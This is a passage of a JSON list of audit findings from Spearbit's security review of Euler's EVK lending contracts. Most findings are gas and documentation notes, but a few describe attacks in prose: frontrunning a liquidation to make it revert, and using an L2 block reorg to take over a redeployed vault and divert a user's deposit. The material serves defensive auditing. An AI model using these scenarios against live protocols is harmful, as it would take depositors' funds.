        "title": "requires using input parameters should go right after the function declaration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "require statements of input parameters are commonly declared right after the function declaration to avoid executing extra logic in the case of an inevitable revert.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Logic only used can be inlined in order to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Some logic in checkNoCollateral is only used once and can be inlined in order to save gas and simplify the logic by reducing steps.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Immutable variables are more gas efficient than storage variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The governor and feeReceiver addresses are declared as variables public. When only assigned once, variables should be marked as immutable for gas optimization, reducing the number of SLOAD operations and improving performance.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Variable can be cached to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Multiple accesses to implementation in createProxy function leads to inefficiencies in gas usage. Caching it into a local variable can save gas and simplify the code.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use custom errors for consistency and gas savings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Although the usage of custom errors is generalized in the repository, a require condition is used instead of a custom error in this case. This should be resolved to keep consistency and save some gas. require(trailingData.length <= MAX_TRAILING_DATA_LENGTH, \"trailing data too long\");",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "BorrowUtils.decreaseBorrow behavior to round up debt should be documented",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Unlike increaseBorrow and transferBorrow that cast the assets amount (of type Assets) to Owed and interact with the user's debt position in Owed terms, the decreaseBorrow operation logic applies the inverse behavior, rounding up the user's exact debt, casting it to Assets and then interact with the repaid amount in Assets terms. Then it proceeds to update both the user's debt balance and totalBorrows recasting the remaining amount of debt to Owed. Following this behavior, the remaining debt of the users (and the totalBorrows as a consequence) will be saved as a rounded up version.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Violators can temporarily prevent liquidations by frontrunning the liquidation transaction and slightly increasing their position health",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "In a liquidation transaction, the liquidator specifies repayAssets, which represents the amount of un- derlying debt transferred from the violator to the sender. The liquidate function invokes the calculateLiquidation function to perform necessary liquidation calculations. At the end of the calculateLiquidation function, there is a check ensuring that desiredRepay is less than or equal to repay, calculated based on the violator's liabilities and collateral balance. 30 function calculateLiquidation( VaultCache memory vaultCache, address liquidator, address violator, address collateral, uint256 desiredRepay ) private view returns (LiquidationCache memory liqCache) { // Init cache // . . . // Checks // . . . liqCache = calculateMaxLiquidation(liqCache, vaultCache); // Adjust for desired repay if (desiredRepay != type(uint256).max) { uint256 maxRepay = liqCache.repay.toUint(); if (desiredRepay > maxRepay) revert E_ExcessiveRepayAmount(); // <--- if (maxRepay > 0) { liqCache.yieldBalance = desiredRepay * liqCache.yieldBalance / maxRepay; liqCache.repay = desiredRepay.toAssets(); } } } Violators can slightly decrease their maxRepay by either increasing their collateral or decreasing their borrowings, without bringing their positions back to health. This might cause the liquidation transaction to revert if the liquidator has performed a partial liquidation or specified an amount close to maxRepay.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Potential reorg attack risk for GenericFactory deployments on L2s",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The GenericFactory uses CREATE instead of CREATE2 for deploying the EVault proxies. Theoretical reorgs on L2s could enable a malicious deployment to divert funds from a legitimate proxy by utilizing the deposits made to this proxy. In a Slack conversation, it was mentioned that there are very loose plans to deploy the project on other chains. An example attack scenario includes the following steps:  Alice creates an EVault via the factory contract in Transaction A.  Alice deposits into the EVault in Transaction B.  A block reorg occurs, causing Transaction A to be discarded while Transaction B remains.  Normally, Transaction B would revert if executed.  Bob then deploys the EVault that Alice initially created, using the same address. 31  The deposit made by Alice now goes to Bob  s vault, performs some malicious actions by using the governor- only functions. More information on Blockchain Reorgs can be found in the Blockchain reorgs for Managers and Auditors article.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Naming improvement suggestions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": " REENTRANCYLOCK__UNLOCKED and REENTRANCYLOCK__LOCKED do not follow the common Open Zeppelin nam- ing case (NOT_ENTERED/ENTERED), additionally it is a long and redundant naming. Consider the following alternative namigs: UNLOCKED/ LOCKED, REENTRANCY_UNLOCKED/REENTRANCY_LOCKED instead.  burn function uses an input address, not msg.sender. Therefore, a more descriptive naming could be burn- From.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "The flashLoan function doesn't emit a dedicated FlashLoan event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The flashLoan function currently only emits the ERC20:Transfer events, which are triggered in the ERC20 transfers.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing EVC() getter on ERC20Collateral and EulerSavingsRate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The ERC20Collateral and EulerSavingsRate are EVC-compatible but, on-chain, one cannot see what EVC these contracts are using as they are missing an EVC() getter to return the internal evc address. It's currently unclear what EVC deployment these contracts that can be used as collateral are compatible with which could lead to misconfigurations.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider not emitting the Approval event in BalanceUtils.decreaseAllowance following the same behavior of OZ ERC20",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The OpenZeppelin implementation of the ERC20 standard emits the Approve event only when the allowance is directly modified via approve.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Vault.skim should follow the same operation order of Vault.deposit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The skim operation is equivalent to a deposit operation without the need to \"pull\" the assets to be deposited from the sender given that those funds have been already deposited into the vault. With such a premise, the skim function should follow the same order of operations that the deposit function is performing when it executes finalizeDeposit(...).",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "liabilityValue does not need to be re-calculated Liquidation.calculateMaxLiquidation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The calculateMaxLiquidation function in the Liquidation modules is recalculating the liabili- tyValue like this uint256 liabilityValue = liqCache.liability.toUint(); if (address(vaultCache.asset) != vaultCache.unitOfAccount) { liabilityValue = vaultCache.oracle.getQuote(liabilityValue, address(vaultCache.asset), vaultCache.unitOfAccount); } But such value has been already calculated at the very beginning of the function and has been stored in liquid- ityLiabilityValue returned by the calculateLiquidity(...) execution.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider improving clearLTV and setLTV(..., ltv=0, ...) documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "While it's clear when the clearLTV should be called (given the Natspec documentation), it's partic- ularly clear the scenarios for which the governance should call setLTV(collateral, 0, rampDuration > 0) or setLTV(collateral, 0, rampDuration = 0) and not clearLTV or vice versa, and which are the specific conse- quences of those three scenarios and what happens when the LTV will reach targetValue = 0.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Governance.clearLTV should revert if the LTV has never been configured",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The clearLTV function should be callable only if an LTV has been configured and initialized.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Enforce EVC compatibility on new collateral added to EVK via setLTV",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The current documentation of EVC and EVK white paper describe the collateral as \"the address of an- other vault\" but the Governance.setLTV function does not perform any sanity check to enforce such requirements.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider including the initialized value in the GovSetLTV to track if the configured LTV is new or not",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The originalLTV == 0 information is not enough to know whether an LTV is new or not. Euler should consider including the initialized value in the GovSetLTV event to understand if the event has been emitted for a new or already configured LTV",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider allowing the user to disable the balance forwarder flag even when balanceTracker is not configured",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Considering the EVault could break if users have enabled balance forwarding and the balance- Tracker has been upgraded to address(0) scenario, a user could personally fix the operation by disabling the Balance Forwarder flag even if balanceTracker is equal to address(0) and the flag was previously enabled.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve the documentation about the Oracle in the EVK white paper",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The Oracle component is a crucial part of the EVK protocol and should be properly documented in both the codebase and EVK whitepaper. Some of the questions that a user, integrator or deployer could have (but not limited to) are:  Can we assume that the EulerRouter (the oracle returned by metadata()) has been correctly configured?  Assuming that the EulerRouter has been correctly configured, can the oracle.getQuote revert?  Assuming that the EulerRouter has been correctly configured, can the oracle.getQuote return 0?  Other assumptions or non-assumptions that can be made/not made?",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve the white paper Interest Overflow section, including the side effects of RPow.rpow overflow scenario",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "When the RPow.rpow overflows, the newInterestAccumulator is not updated and will use the old cached value. This means that interest is not accrued and newTotalBorrows will remain equal to vault- Cache.totalBorrows. If newTotalBorrows is <= MAX_SANE_DEBT_AMOUNT vault will update lastInterestAccumulatorUpdate to uint48(block.timestamp) anyway (unlike the case when newTotalBorrows overflows the sane amount). As a consequence, the whole interest accrued during deltaT time will be lost and \"reset\".",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider enhancing the Base.isOperationDisabled and all the max* vault functions documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "An EVault operation can be considered disabled in two cases: 1) The hookedOps flag of the operation is set and the hookTarget == address(0). 2) The hookedOps flag of the operation is set, the hookTarget != address(0) and the hookTarget reverts internally in a \"sane\" way to disclose the disablement of the operation. The second case can't be evaluated directly by the protocol without executing directly the operation, and it's out of scope of current usage of isOperationDisabled inside EVault that optimistically evaluates the maximum number of tokens that can be deposited/minted/withdrawn/redeemed. Given that the second scenario could happen, such an eventuality should be documented in both the isOpera- tionDisabled and all the max* vault functions to warn the user that the returned value is an optimistic evaluation.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "BorrowingUtils.transferBorrow and BalanceUtils.transferBalance do not handle correctly the self-transfer case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "In both functions, when from == to the account balance will be wrongly updated. With the current codebase, this is not a security issue because the callers of this function will revert when the user tries to self- transfer to itself, but it's a good practice to avoid these kinds of mistakes directly to ensure that future changes to the protocol won't fall into this problem.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "EVault could break if users have enabled balance forwarding and the balanceTracker has been upgraded to address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Every time the user's balance changes or the balance tracking flag is changed to true or false the balanceTracker.balanceTrackerHook hook will be triggered. While in the BalanceForwarderModule module the flag can be changed only if the balanceTracker has been con- figured, and for such reason, the hook can be triggered only in a non-reverting environment, in the BalanceUtils the value of balanceTracker is never sanity checked, and the hook is always triggered if the user has enabled the flag. If the user has enabled the flag and the EVault is upgraded to a vault that has the balanceTracker set to ad- dress(0) any interaction with the vault that updates the user's balance will revert, resulting in a broken vault. 37",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Zero address returned from MetaProxyDeployer is not explicitly handled in GenericFactory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The MetaProxyDeployer uses the CREATE opcodes to create a new instance, which returns a zero address and does not revert if the deployment fails. If a zero address is returned, execution will revert during IComponent(proxy).initialize(msg.sender).",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "IBalanceTracker natspec documentation should be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Unlike all always increased or decreased compared to the value before the operation, ule.enableBalanceForwarder balanceTracker.balanceTrackerHook with \"special\" values. the \"normal\" operations inside the various modules where the balance is the BalanceForwarderMod- execute BalanceForwarderModule.disableBalanceForwarder will and  BalanceForwarderModule.enableBalanceForwarder will always report the current user's balance, unchanged.  BalanceForwarderModule.disableBalanceForwarder will always report 0 even if the balance of the user is greater than zero. On top of these \"special\" values, the contract that implements the IBalanceTracker interface should be aware that balanceTrackerHook could be called multiple times, even inside the same block, given that enableBalanceFor- warder and disableBalanceForwarder have no restrictions. These custom behaviors should be documented by the IBalanceTracker interface for the newAccountBalance parameter.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate Deposit event can be emitted during the skim function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "When the skim function is called, the Deposit event is emitted with the onBehalfOfAccount as the sender. However, the onBehalfOfAccount might not be responsible for the excess asset balance.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding to the PegStabilityModule utility functions that allow to preview the amount of asset received with a swap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "PegStabilityModule allows users to exchange ESynth asset for an underlying asset (less a fee) It would be helpful for the users, before executing the real exchange, to preview the returning and vice versa. amount given:  the fee to be applied.  The available liquidity of the assets:  Available underlying balance if the users want to swap ESynth for underlying.  Available PegStabilityModule minting capacity if the users want to swap underlying for ESynth (that must be minted new).  Possible user restriction when the user's ESynth asset are exchanged (burned) for underlying. The ESynth.burn function calls ERC20Collateral._update which will require an account status check for the user who has called the PegStabilityModule. If the user has enabled a controller and is unhealthy, the transaction will revert.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "If gulp is never called, available interest is not accounted and accrued and withdrawing users won't receive deserved interest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "gulp is the ESR mechanism that starts the accrual of the amount of asset that has been sent to the ESR by an external entity. Once gulp is called, such amount is added to esrSlot.interestLeft and esrSlot.interestSmearEnd is resetted to block.timestamp + INTEREST_SMEAR. If no one calls gulp, the interest won't start accruing even if it has been already deposited in the ESR module, and users who withdraw from the ESR module won't receive the deserved interest that they should receive: 1) Alice deposits 10e18. 2) 10e18 interests are sent to the ESR. 3) Alice waits 2 weeks. 4) Alice withdraws, thinking that she will get 20e18, but she will only get back her 10e18 initially deposited.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "EulerSavingsRate uses default virtual shares",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The EulerSavingsRate is itself an ERC4626 vault that can directly be used as collateral in the EVC, without first wrapping the shares in an escrow vault. Therefore, it should implement the same parameters as the eVault to get the same level of price share manipulation resistance.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "maxRedeemInternal could be private",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The maxRedeemInternal function could be private instead of internal, similar to maxDepositIn- ternal.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "RiskManager.checkAccountStatus will be executed even if the user has interacted with a non- collateral asset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "When an account (directly or \"indirectly\" on behalf of him/her) performs an operation (transfer, redeem, withdraw) that could decrease his/her health factor, the EVK ecosystem (EVault, ESynth, PegStability- Module, EulerSavingRate) will require the EVC to perform a check at the end of the EVC call or batch flow if the user has enabled a controller. At the end of the flow, EVC will call RiskManager.checkAccountStatus which will always revert if the user is un- healthy. If the user has a controller enabled, this logic will always be executed, without considering which was the asset that was interacted with. This means that checkAccountStatus will be invoked even if the user had not enabled the asset as collateral. When an asset is not enabled as collateral, it means that it cannot influence the user's health factor and should be allowed to be transferred or withdrawn freely without triggering a health check status. Because of the EVK/EVC logic and the current behavior, we have the following negative side effects:  If the user is unhealthy, the transaction will revert even if the user tries to transfer, redeem or withdraw a non-collateral asset (that cannot decrease the HF furthermore).  transfer, redeem or withdraw of a non-collateral asset will consume more gas than it should because of the check-account-status additional logic. The above negative side effects will be applied in all these cases:  EVK transfer, transferFrom, withdraw and redeem.  ESynth transfer and transferFrom.  Swapping ESynth for underlying on the PegStabilityModule via the swapToUnderlyingGivenIn and swap- ToUnderlyingGivenOut.  EulerSavingRate transfer, transferFrom, withdraw and redeem. Note that this behavior differs from what a normal user is used to with other lending protocols. Usually, an operation that involves a non-collateral asset can be performed freely without any restriction related to the user's health factor and will consume less compared to an operation on a collateral asset.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Observed values related to interestAccumulator can drop once loadVault() handles overflows",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Some functions only load the vault and update it in memory, without writing the updated data back to storage. Combined with the fact that old interest accumulators (and by extension old totalBorrows and to- talShares) are used in case the new interest accumulator would overflow, it can lead to the situation that view functions or checkAccountStatus use values that first rise, but then suddenly drop once the accumulator overflows.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Liquidations that don't repay debt still emit borrow events",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "If the violator is healthy, liquidation continues with a no-op. The transferBorrow(vaultCache, liqCache.violator, liqCache.liquidator, liqCache.repay); code is always executed and would emit events transferring 0 assets.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Ambiguous return parameters for loop / deloop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The deloop function can readjust the assets parameter in case assets > owed. A caller must not believe that the returned shares are equivalent to the amount parameter they used (even if amount != uint256.max).",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unclear usecase for loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The Euler protocol does not allow self-collateralization (using the same asset as collateral that is borrowed). Therefore, any loop call can be implemented with a single round of a borrow(account); de- posit(sharesReceiver) sequence in a batch.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Caching of interest rate could lead to issues for non-pure IRMs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The interest rate is retrieved from the IRM once in the checkVaultStatus function. The result is then cached to storage. This cached rate will be used in the subsequent vault interactions (that can happen at different blocks). If an advanced IRM depends on block.timestamp or other derived on-chain state, the interest rate can change but it will not be used for the active vault interactions.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Interest rate will be underestimated due to keeping utilisation constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The interest rate compounds every second with a cached interest rate (per second). However, the IRM would quote a higher interest rate if the compounding happened every second (or block) as the utilisation = totalBorrows / (totalBorrows + cash) increases.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Forgiving vault checks would end up with lingering snapshot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "In case the EVK implements an EVC.forgiveVaultStatusCheck call, the vault snapshot would not be cleared as it is only cleared in the checkVaultStatus callback. The next vault interaction will not overwrite the snapshot, instead, it will perform the check on an outdated, lingering snapshot.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent rounding for yield = repay / discount liquidation computation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "For liquidations, the repaid amount relates to the seized collateral (yield) by yield = repay / dis- count, rounding down the yield. However, if the violator's collateral balance is less than the max yield, the entire collateral balance is seized and the repaid amount is readjusted, rounding down the repaid amount this time.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "IPriceOracle is out of sync with euler-price-oracle repo",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The interface appears to be out of sync with the euler-price-oracle repository and is inconsistent. It includes features like the name getter, which isn't present in the original. Moreover, defined errors are only used in MockPriceOracle.sol during testing.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused reentrancy lock in BaseProductLine",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "reentrancyLock is not used actively at BaseProductLine nor on any contract that inherits from it, therefore it should be removed",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused logic and confusing event in setVaultInterestFeeRange and setVaultFeeConfig",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "When exists_ is false, updating _interestFeeRanges[vault] with a non-default value and emit- ting an event can be confusing. It forces the caller to provide valid minInterestFee_ and maxInterestFee_ values, which won't be used when _interestFeeRanges is retrieved because it would be necessary to re-execute set- VaultInterestFeeRange(vault, true, ...) to enable it with proper interest fees.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "uint caps version is not consistently used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "vaultCache uses the uint256 version of caps rather than the uint16 version from vaultStorage (AmountCap):  If vaultCache.supplyCap != type(uint256).max, it should be <= 2 * MAX_SANE_AMOUNT (see Governance.setCaps checks).  If vaultCache.borrowCap != type(uint256).max, it should be <= MAX_SANE_AMOUNT (see Governance.setCaps checks). Using the type(uint256).max value directly for the \"no cap\" scenario would be cleaner",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "pushAssets would benefit from extra documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "The handling of sub-accounts through the EVC flag would benefit from extra clarifications. 1. CFG_EVC_COMPATIBLE_ASSET flag: This flag should be true if the vault's underlying asset is another vault or an EVC-compatible ERC20Collateral. 2. pushAssets function checks: The whole idea of the checks is to protect users from mistakenly setting a sub-account (non-zero one) as receiver in functions that send tokens out (withdraw, redeem, borrow). If a regular asset is sent to a sub-account it would effectively be lost, since the private keys are not known. It's only EVC that understands that sub-accounts have owners and only assets that authenticate through EVC can safely accept receiver that is a sub-account. 3. Example USDC Vault transfer cases:  Case 1: transfer to non-registered EVC account ! success. It is allowed just because it is not known if it's a sub-account or owner.  Case 2: transfer to a registered EVC account that is equal to the owner of the account ! success. You know that account can indeed interact with EVC so it means that it's an EOA/contract that will be able to interact eventually with the ERC20. This is not entirely true, you know that account can interact with EVC, but you don't know if it can interact with the asset. account in this case could be != originalCaller.  Case 3: transfer to a registered EVC account that's not owned by the caller, with a high probability that the asset is unrecoverable as that owner probably does not own the private key of the account to later on interact with asset. 46",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "calculateDTokenAddress may fail if anything changes in the future code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "ule.initialize creates a new DToken as the first contract deployed by the vault. On calculateDTokenAddress, mstore8(0x34, 0x01) is true because InitializeMod- If anything changes in the future code of InitializeModule.initialize or during the initialization flow (contract deployed before DToken) the 0x01 value should be adjusted accordingly.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "checkLiquidation doesn't revert if violator has no debt or has more collateral than debt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "checkLiquidation function does not revert if the violator has no debt or has more collateral than debt (in value). In that case, both maxRepay and maxYield will be equal to zero.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistency in CONTROLLER_NEUTRAL_OPS",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "CONTROLLER_NEUTRAL_OPS is a constant that incorporates different OPs for later use: uint32 constant CONTROLLER_NEUTRAL_OPS = OP_DEPOSIT | OP_MINT | OP_WITHDRAW | OP_REDEEM | OP_TRANSFER | ,! OP_SKIM | OP_REPAY | OP_DELOOP | OP_CONVERT_FEES | OP_FLASHLOAN | OP_TOUCH; However, it is noticed that OP_VAULT_STATUS_CHECK should be one of the controller-neutral operations because it's unrelated to a specific account's borrowing state. It doesn't matter in the actual state of the codebase as it's not used via initOperation (the only place CON- TROLLER_NEUTRAL_OPS is used) but so does OP_FLASHLOAN and it is in this list.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Casting to the same type is redundant and adds verbosity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Casting a type to the same type is redundant and adds verbosity. In EVCClient, evc (of IEVC type) is cast to IEVC again.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "validate should be moved to Types.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "ConfigAmountLib.validate is only used in Types.sol and therefore, the logic can be moved to Types.sol in order to enhance simplicity and coherence.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consistently use toUint rather than unwrap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf",
        "body": "Assets, Shares, Owed and ConfigAmount libraries all define a toUintX function that unwraps the different types into some uint-like type. To be coherent with the use of unwrap and all the different toUint functions should be consistent unless there's a specific reason to not do it.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "interestAccruedFromCache can avoid extra operations and return earlier",
